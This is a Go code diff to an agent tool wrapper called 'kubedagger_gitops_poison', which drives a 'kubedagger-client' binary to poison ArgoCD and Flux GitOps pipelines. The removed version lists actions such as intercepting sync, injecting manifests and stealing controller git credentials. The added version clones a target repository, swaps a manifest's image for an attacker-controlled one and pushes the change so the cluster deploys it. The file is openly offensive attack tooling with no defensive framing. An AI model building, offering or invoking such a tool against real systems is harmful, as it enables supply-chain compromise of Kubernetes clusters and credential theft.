@@ -11,11 +11,9 @@ import (
 )
 
 type GitOpsPoisonInput struct {
-	Action     string `json:"action"`
-	Controller string `json:"controller,omitempty"`
-	Repo       string `json:"repo,omitempty"`
-	Path       string `json:"path,omitempty"`
-	Payload    string `json:"payload,omitempty"`
+	Repo        string `json:"repo,omitempty"`
+	TargetPath  string `json:"target_path,omitempty"`
+	InjectImage string `json:"inject_image,omitempty"`
 }
 
 type GitOpsPoisonTool struct {
@@ -29,37 +27,26 @@ func NewGitOpsPoison(exec executor.Executor) *GitOpsPoisonTool {
 func (t *GitOpsPoisonTool) Name() string { return "kubedagger_gitops_poison" }
 
 func (t *GitOpsPoisonTool) Description() string {
-	return "Poison GitOps controllers (ArgoCD, Flux) by intercepting git-sync operations or manipulating the reconciliation loop. Can inject manifests during sync, modify resources post-apply, or backdoor the controller's git credentials."
+	return "Poison GitOps pipelines (ArgoCD, Flux) by tampering with the source repository. Clones the repo, replaces the image reference at the target manifest path with an attacker-controlled image, and pushes the change so the controller rolls it out."
 }
 
 func (t *GitOpsPoisonTool) InputSchema() json.RawMessage {
 	return json.RawMessage(`{
 		"type": "object",
 		"properties": {
-			"action": {
-				"type": "string",
-				"enum": ["intercept-sync", "inject-manifest", "steal-creds", "modify-reconcile", "status"],
-				"description": "GitOps poisoning action"
-			},
-			"controller": {
-				"type": "string",
-				"enum": ["argocd", "flux", "auto"],
-				"description": "Target GitOps controller"
-			},
 			"repo": {
 				"type": "string",
-				"description": "Target git repository"
+				"description": "Target git repository URL"
 			},
-			"path": {
+			"target_path": {
 				"type": "string",
-				"description": "Manifest path to inject into"
+				"description": "Path within the repo of the manifest to poison"
 			},
-			"payload": {
+			"inject_image": {
 				"type": "string",
-				"description": "Manifest content to inject"
+				"description": "Attacker-controlled image reference to inject"
 			}
-		},
-		"required": ["action"]
+		}
 	}`)
 }
 
@@ -72,25 +59,22 @@ func (t *GitOpsPoisonTool) Execute(ctx context.Context, params json.RawMessage) 
 	if err := validateSafeString(input.Repo, "repo"); err != nil {
 		return errorResult(err.Error()), nil
 	}
-	if err := validateSafeString(input.Path, "path"); err != nil {
+	if err := validateSafeString(input.TargetPath, "target_path"); err != nil {
 		return errorResult(err.Error()), nil
 	}
-	if err := validateSafeString(input.Payload, "payload"); err != nil {
+	if err := validateSafeString(input.InjectImage, "inject_image"); err != nil {
 		return errorResult(err.Error()), nil
 	}
 
-	args := []string{"gitops-poison", "--action", input.Action}
-	if input.Controller != "" {
-		args = append(args, "--controller", input.Controller)
-	}
+	args := []string{"gitops-poison"}
 	if input.Repo != "" {
 		args = append(args, "--repo", input.Repo)
 	}
-	if input.Path != "" {
-		args = append(args, "--path", input.Path)
+	if input.TargetPath != "" {
+		args = append(args, "--target-path", input.TargetPath)
 	}
-	if input.Payload != "" {
-		args = append(args, "--payload", input.Payload)
+	if input.InjectImage != "" {
+		args = append(args, "--inject-image", input.InjectImage)
 	}
 
 	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
@@ -104,7 +88,7 @@ func (t *GitOpsPoisonTool) Execute(ctx context.Context, params json.RawMessage) 
 
 	output := strings.TrimSpace(string(result.Stdout))
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "## KubeDagger GitOps Poison: %s\n\n", input.Action)
+	sb.WriteString("## KubeDagger GitOps Poison\n\n")
 	if output == "" {
 		sb.WriteString("Operation completed.\n")
 	} else {
